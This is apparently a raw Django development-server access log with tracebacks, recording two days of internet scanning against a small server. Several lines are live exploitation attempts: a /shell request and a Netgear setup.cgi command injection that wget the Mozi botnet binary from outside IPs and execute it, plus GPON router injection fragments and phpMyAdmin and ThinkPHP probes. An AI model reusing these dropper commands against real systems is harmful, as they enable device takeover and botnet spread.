[19/Oct/2020 01:16:01] "s\x9c\xa2F¡Á	\x9cN¨°'n\x85{=D\x8c\xa1\xbcd¡§\xe3\xbc\xde$"h¡§\xe3\xbce\xac\xa1\xbcd¡§¨¤\xb4d¡§\xe3\xbcd¡§\xe3\xbc\xce¡§\xe3\xbcd¡§\xc8\x97d¡§\xe3\xbcL¡§\xe3\xbcd¡§\xe3\xbcd¡§\xe3\xbcd¡§\xe3\xbce\xa9\xe3\xbcd¡§\xf5\xbcd¡§\xe3\xbcd¡§\xe3\xbcd¡§\xe3\xbcd¡§\xe3\xbcd¡§\xe7\xbcd¡§\xe3\xbcd¡§\xe3\xbc " 400 -
[19/Oct/2020 01:16:01] "GET /requested.html HTTP/1.1" 404 179
[19/Oct/2020 01:58:14] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://125.47.252.164:52186/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 200 40
[19/Oct/2020 01:59:23] "GET / HTTP/1.1" 200 643
[19/Oct/2020 02:36:04] "GET / HTTP/1.1" 200 643
[19/Oct/2020 02:43:58] "GET / HTTP/1.1" 200 643
[19/Oct/2020 02:52:28] "GET /index.php HTTP/1.1" 404 179
[19/Oct/2020 02:52:28] "GET /phpmyadmin/index.php HTTP/1.1" 404 179
[19/Oct/2020 03:33:26] "GET http://150.158.7.54/ HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('183.192.179.16', 64315)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[19/Oct/2020 03:49:49] "GET / HTTP/1.1" 200 643
[19/Oct/2020 03:51:44] "CONNECT ip.ws.126.net:443 HTTP/1.1" 404 179
[19/Oct/2020 04:28:41] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 179
[19/Oct/2020 04:28:41] code 400, message Bad request syntax ('0;sh+/tmp/gpon80&ipv=0')
[19/Oct/2020 04:28:41] "0;sh+/tmp/gpon80&ipv=0" 400 -
[19/Oct/2020 04:40:51] "GET / HTTP/1.0" 200 643
[19/Oct/2020 05:24:48] "GET http://150.158.7.54/ HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('101.89.19.140', 51945)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[19/Oct/2020 05:37:04] "GET /muieblackcat HTTP/1.1" 404 179
[19/Oct/2020 05:37:05] "GET //phpMyAdmin/scripts/setup.php HTTP/1.1" 404 179
[19/Oct/2020 05:37:05] "GET //phpmyadmin/scripts/setup.php HTTP/1.1" 404 179
[19/Oct/2020 05:37:06] "GET //PMA/scripts/setup.php HTTP/1.1" 404 179
[19/Oct/2020 05:37:06] "GET //admin/scripts/setup.php HTTP/1.1" 404 179
[19/Oct/2020 05:37:07] "GET //dbadmin/scripts/setup.php HTTP/1.1" 404 179
[19/Oct/2020 05:37:07] "GET //mysql/scripts/setup.php HTTP/1.1" 404 179
[19/Oct/2020 05:37:08] "GET //webdav/wickd.php HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('61.219.11.153', 63673)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[19/Oct/2020 07:08:08] "GET http://150.158.7.54/phpmyadmin/ HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('182.254.52.17', 49122)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[19/Oct/2020 07:10:22] "GET / HTTP/1.1" 200 643
[19/Oct/2020 07:27:09] "GET / HTTP/1.1" 200 643
[19/Oct/2020 08:44:35] "GET / HTTP/1.1" 200 643
[19/Oct/2020 08:47:40] "POST /editBlackAndWhiteList HTTP/1.1" 404 179
[19/Oct/2020 08:59:40] "GET / HTTP/1.1" 200 643
[19/Oct/2020 09:08:15] "GET / HTTP/1.1" 200 643
[19/Oct/2020 09:28:44] "GET / HTTP/1.1" 200 643
[19/Oct/2020 10:00:44] "GET / HTTP/1.1" 200 643
[19/Oct/2020 10:01:31] "GET / HTTP/1.1" 200 643
[19/Oct/2020 10:01:44] "GET /favicon.ico HTTP/1.1" 404 179
[19/Oct/2020 10:14:44] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 179
[19/Oct/2020 10:14:44] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 179
[19/Oct/2020 10:29:36] "POST /editBlackAndWhiteList HTTP/1.1" 404 179
[19/Oct/2020 11:17:42] "GET http://150.158.7.54/ HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('101.89.19.140', 34183)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[19/Oct/2020 11:24:07] "GET http://150.158.7.54/ HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('182.254.52.17', 41274)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[19/Oct/2020 11:54:52] "GET / HTTP/1.1" 200 643
[19/Oct/2020 13:05:48] "GET / HTTP/1.1" 200 643
[19/Oct/2020 13:41:08] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 179
[19/Oct/2020 13:41:09] code 400, message Bad request syntax ('sh+/tmp/gpon80&ipv=0')
[19/Oct/2020 13:41:09] "sh+/tmp/gpon80&ipv=0" 400 -
[19/Oct/2020 14:06:32] "GET / HTTP/1.1" 200 643
[19/Oct/2020 14:30:20] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*¨¤\x00\x00\x00\x00\x00Cookie:')
[19/Oct/2020 14:30:20] "  /*¨¤     Cookie: mstshash=Administr" 400 -
[19/Oct/2020 14:40:17] "GET / HTTP/1.0" 200 643
[19/Oct/2020 15:01:56] "GET http://example.com/ HTTP/1.1" 404 179
Traceback (most recent call last):
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 274, in write
    self.send_headers()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 332, in send_headers
    self.send_preamble()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 252, in send_preamble
    self._write(('HTTP/%s %s\r\n' % (self.http_version,self.status)).encode('iso-8859-1'))
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.6/socketserver.py", line 803, in write
    self._sock.sendall(b)
ConnectionResetError: [Errno 104] Connection reset by peer
[19/Oct/2020 15:01:56] "GET http://example.com/ HTTP/1.1" 500 59
----------------------------------------
Exception happened during processing of request from ('185.39.11.105', 38802)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 274, in write
    self.send_headers()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 332, in send_headers
    self.send_preamble()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 252, in send_preamble
    self._write(('HTTP/%s %s\r\n' % (self.http_version,self.status)).encode('iso-8859-1'))
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.6/socketserver.py", line 803, in write
    self._sock.sendall(b)
ConnectionResetError: [Errno 104] Connection reset by peer

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 141, in run
    self.handle_error()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 119, in handle_error
    super().handle_error()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 368, in handle_error
    self.finish_response()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 274, in write
    self.send_headers()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 331, in send_headers
    if not self.origin_server or self.client_is_modern():
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 344, in client_is_modern
    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
TypeError: 'NoneType' object is not subscriptable

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 197, in handle_one_request
    handler.run(self.server.get_app())
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 144, in run
    self.close()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 114, in close
    super().close()
  File "/usr/lib64/python3.6/wsgiref/simple_server.py", line 35, in close
    self.status.split(' ',1)[0], self.bytes_sent
AttributeError: 'NoneType' object has no attribute 'split'
----------------------------------------
[19/Oct/2020 15:01:57] "CONNECT dnspod.qcloud.com:443 HTTP/1.1" 404 179
[19/Oct/2020 16:32:49] "GET / HTTP/1.1" 200 643
----------------------------------------
Exception happened during processing of request from ('167.248.133.35', 33540)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[19/Oct/2020 16:51:13] "GET / HTTP/1.1" 200 643
----------------------------------------
Exception happened during processing of request from ('167.248.133.35', 59782)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[19/Oct/2020 16:51:13] "GET / HTTP/1.1" 200 643
[19/Oct/2020 17:17:52] "GET /TP/public/index.php HTTP/1.1" 404 179
[19/Oct/2020 17:17:52] "GET /TP/index.php HTTP/1.1" 404 179
[19/Oct/2020 17:17:52] "GET /thinkphp/html/public/index.php HTTP/1.1" 404 179
[19/Oct/2020 17:17:52] "GET /html/public/index.php HTTP/1.1" 404 179
[19/Oct/2020 17:17:52] "GET /public/index.php HTTP/1.1" 404 179
[19/Oct/2020 17:17:52] "GET /TP/html/public/index.php HTTP/1.1" 404 179
[19/Oct/2020 17:17:52] "GET /elrekt.php HTTP/1.1" 404 179
[19/Oct/2020 17:17:52] "GET /index.php HTTP/1.1" 404 179
[19/Oct/2020 17:17:52] "GET / HTTP/1.1" 200 643
[19/Oct/2020 18:37:58] "GET /portal/redlion HTTP/1.1" 404 179
[19/Oct/2020 19:06:49] "GET / HTTP/1.1" 200 643
[19/Oct/2020 20:26:51] "GET / HTTP/1.1" 200 643
[19/Oct/2020 20:27:26] "GET / HTTP/1.1" 200 643
[19/Oct/2020 20:27:46] "GET /favicon.ico HTTP/1.1" 404 179
[19/Oct/2020 21:04:04] "GET / HTTP/1.1" 200 643
[19/Oct/2020 21:04:04] "GET / HTTP/1.1" 200 643
[19/Oct/2020 21:04:05] "GET /favicon.ico HTTP/1.1" 404 179
[19/Oct/2020 21:45:20] "GET /config/getuser?index=0 HTTP/1.1" 404 179
[19/Oct/2020 22:24:01] "GET / HTTP/1.0" 200 643
[19/Oct/2020 22:49:35] "HEAD http://123.125.114.144/ HTTP/1.1" 404 179
[20/Oct/2020 00:44:05] "GET / HTTP/1.0" 200 643
----------------------------------------
Exception happened during processing of request from ('162.142.125.36', 55122)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[20/Oct/2020 02:04:43] "GET / HTTP/1.1" 200 643
----------------------------------------
Exception happened during processing of request from ('162.142.125.36', 32906)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[20/Oct/2020 02:04:43] "GET / HTTP/1.1" 200 643
[20/Oct/2020 02:39:47] "POST /HNAP1/ HTTP/1.0" 404 179
[20/Oct/2020 03:33:27] "GET / HTTP/1.1" 200 643
[20/Oct/2020 04:39:26] "GET / HTTP/1.0" 200 643
[20/Oct/2020 04:54:17] "GET / HTTP/1.1" 200 643
----------------------------------------
Exception happened during processing of request from ('104.152.52.3', 55081)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
----------------------------------------
Exception happened during processing of request from ('104.152.52.3', 59893)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[20/Oct/2020 05:15:52] "GET / HTTP/1.0" 200 643
[20/Oct/2020 05:15:52] "OPTIONS / HTTP/1.0" 200 643
[20/Oct/2020 05:15:52] code 400, message Bad request version ('RTSP/1.0')
[20/Oct/2020 05:15:52] "OPTIONS / RTSP/1.0" 400 -
[20/Oct/2020 05:15:58] code 400, message Bad HTTP/0.9 request type ('l\x00')
[20/Oct/2020 05:15:58] "l          " 400 -
[20/Oct/2020 05:15:58] "GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0" 404 179
[20/Oct/2020 05:16:04] code 400, message Bad request version ('\x00\x01\x97|\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
[20/Oct/2020 05:16:04] "\x80  (r\xfe        \x86\xa0 \x97|                    " 400 -
[20/Oct/2020 05:16:09] code 400, message Bad HTTP/0.9 request type ('\x00')
[20/Oct/2020 05:16:09] "          versionbind   " 400 -
[20/Oct/2020 05:16:14] code 400, message Bad HTTP/0.9 request type ('\x00')
[20/Oct/2020 05:16:14] "            " 400 -
[20/Oct/2020 05:16:14] code 400, message Bad request syntax ('HELP')
[20/Oct/2020 05:16:14] "HELP" 400 -
[20/Oct/2020 05:16:15] code 400, message Bad request syntax ('\x16\x03\x00\x00S\x01\x00\x00O\x03\x00?G¡Á¡Â\xba,\xee¨º\xb2`~¨®\x00\xfd\x82{\xb9\xd5\x96\xc8w\x9b\xe6\xc4\xdb<=\xdbo\xef\x10n\x00\x00(\x00\x16\x00\x13\x00')
[20/Oct/2020 05:16:15] You're accessing the development server over HTTPS, but it only supports HTTP.

[20/Oct/2020 05:16:20] code 400, message Bad request syntax ('\x00\x00\x00¡è\xffSMBr\x00\x00\x00\x00\x08\x01@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x06\x00\x00\x01\x00\x00\x81\x00\x02PC NETWORK PROGRAM 1.0\x00\x02MICROSOFT NETWORKS 1.03\x00\x02MICROSOFT NETWORKS 3.0\x00\x02LANMAN1.0\x00\x02LM1.2X002\x00\x02Samba\x00\x02NT LANMAN 1.0\x00\x02NT LM 0.12\x00')
[20/Oct/2020 05:16:20] "   ¡è\xffSMBr    @              @    \x81 PC NETWORK PROGRAM 1.0 MICROSOFT NETWORKS 1.03 MICROSOFT NETWORKS 3.0 LANMAN1.0 LM1.2X002 Samba NT LANMAN 1.0 NT LM 0.12 " 400 -
[20/Oct/2020 05:16:20] code 400, message Bad request syntax ('\x01default')
[20/Oct/2020 05:16:20] "default" 400 -
[20/Oct/2020 05:16:26] code 400, message Bad HTTP/0.9 request type ('0')
[20/Oct/2020 05:16:26] "0` \x80 " 400 -
[20/Oct/2020 05:16:26] code 400, message Bad request version ('SIP/2.0')
[20/Oct/2020 05:16:26] "OPTIONS sip:nm SIP/2.0" 400 -
[20/Oct/2020 05:33:55] "GET /TP/public/index.php HTTP/1.1" 404 179
[20/Oct/2020 05:33:55] "GET /TP/index.php HTTP/1.1" 404 179
[20/Oct/2020 05:33:55] "GET /thinkphp/html/public/index.php HTTP/1.1" 404 179
[20/Oct/2020 05:33:55] "GET /html/public/index.php HTTP/1.1" 404 179
[20/Oct/2020 05:33:55] "GET /public/index.php HTTP/1.1" 404 179
[20/Oct/2020 05:33:55] "GET /TP/html/public/index.php HTTP/1.1" 404 179
[20/Oct/2020 05:33:55] "GET /elrekt.php HTTP/1.1" 404 179
[20/Oct/2020 05:33:56] "GET /index.php HTTP/1.1" 404 179
[20/Oct/2020 05:33:56] "GET / HTTP/1.1" 200 643
[20/Oct/2020 06:12:39] "GET / HTTP/1.1" 200 643
[20/Oct/2020 07:01:24] "GET / HTTP/1.1" 200 643
[20/Oct/2020 07:44:44] "GET /TP/public/index.php HTTP/1.1" 404 179
[20/Oct/2020 07:44:45] "GET /TP/index.php HTTP/1.1" 404 179
[20/Oct/2020 07:44:45] "GET /thinkphp/html/public/index.php HTTP/1.1" 404 179
[20/Oct/2020 07:44:45] "GET /html/public/index.php HTTP/1.1" 404 179
[20/Oct/2020 07:44:45] "GET /public/index.php HTTP/1.1" 404 179
[20/Oct/2020 07:44:46] "GET /TP/html/public/index.php HTTP/1.1" 404 179
[20/Oct/2020 07:44:46] "GET /elrekt.php HTTP/1.1" 404 179
[20/Oct/2020 07:44:46] "GET /index.php HTTP/1.1" 404 179
[20/Oct/2020 07:44:46] "GET / HTTP/1.1" 200 643
[20/Oct/2020 08:02:00] "GET / HTTP/1.1" 200 643
[20/Oct/2020 08:33:04] "POST /HNAP1/ HTTP/1.0" 404 179
[20/Oct/2020 08:53:36] "GET / HTTP/1.0" 200 643
----------------------------------------
Exception happened during processing of request from ('74.120.14.52', 46382)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[20/Oct/2020 10:05:00] code 400, message Bad request syntax ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xcdf¨´¨¦\xe7\xe3\r\xb5\x8a\x86"\x8b\x96\x1d8\x1d\xa9\x82rK\x89X\xa0\xd1\xd2\x0c0\x05\xfeq6Z\x00\x00\x1a\xc0/\xc0+\xc0\x11\xc0\x07\xc0\x13\xc0\t\xc0\x14\xc0')
[20/Oct/2020 10:05:00] You're accessing the development server over HTTPS, but it only supports HTTP.

[20/Oct/2020 10:07:07] "GET / HTTP/1.1" 200 643
[20/Oct/2020 10:43:03] "GET / HTTP/1.0" 200 643
[20/Oct/2020 10:49:24] "GET / HTTP/1.1" 200 643
[20/Oct/2020 10:50:58] "GET / HTTP/1.1" 200 643
[20/Oct/2020 11:04:21] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://112.237.133.190:33045/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 179
[20/Oct/2020 11:10:25] code 400, message Bad request syntax ('\x16\x03\x01\x01"\x01\x00\x01\x1e\x03\x03\xbe\xc5\xc7\\#\x8c3HW\x8bN\xf8¨´I5EC3¡ã\xca¡Á\r\xd2\x89\x0f\x11\x16\x0f\xc6 z\xdf\x00\x00\x88\xc00\xc0,\xc0(\xc0$\xc0\x14\xc0')
[20/Oct/2020 11:10:25] You're accessing the development server over HTTPS, but it only supports HTTP.

[20/Oct/2020 11:10:25] code 400, message Bad request syntax ('\x16\x03\x01\x01"\x01\x00\x01\x1e\x03\x03\x19\x98\x95\xc6+\x84N\x08\x0c\xbb\x93¨²\x11\xac¨¹¨°¨¨¡ã}[\xbcq>\xd9¨¹\x1d¨ª\xcb?C]\xfd\x00\x00\x88\xc00\xc0,\xc0(\xc0$\xc0\x14\xc0')
[20/Oct/2020 11:10:25] You're accessing the development server over HTTPS, but it only supports HTTP.

[20/Oct/2020 11:10:25] code 400, message Bad request syntax ('\x16\x03\x01\x00\xc6\x01\x00\x00\xc2\x03\x02aKKb\x8bIm\xbe\x19\x12¨¤p\x07\xc9\xa5K\xe4\x15\xae¡Â\xdf9NZ\x88\x04\xf0\xcb\xdb\xc2\x0e\xb8\x00\x00P\xc0\x14\xc0')
[20/Oct/2020 11:10:25] You're accessing the development server over HTTPS, but it only supports HTTP.

[20/Oct/2020 11:10:27] code 400, message Bad request syntax ('\x16\x03\x01\x00\xc6\x01\x00\x00\xc2\x03\x01\x07\x85\x90¡Â\x15Q\x0co¨¹\xa3\xbd$\xe7\xc9\x87\xf6&J\x0f\x81qW¨¦#\xc0!\x9b\xd2\x1e5\xd5\x92\x00\x00P\xc0\x14\xc0')
[20/Oct/2020 11:10:27] You're accessing the development server over HTTPS, but it only supports HTTP.

[20/Oct/2020 11:10:27] "GET / HTTP/1.1" 200 643
----------------------------------------
Exception happened during processing of request from ('101.251.242.238', 58241)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[20/Oct/2020 11:59:29] "GET / HTTP/1.1" 200 643
[20/Oct/2020 12:29:24] "GET / HTTP/1.1" 200 643
[20/Oct/2020 12:43:17] "GET / HTTP/1.1" 200 643
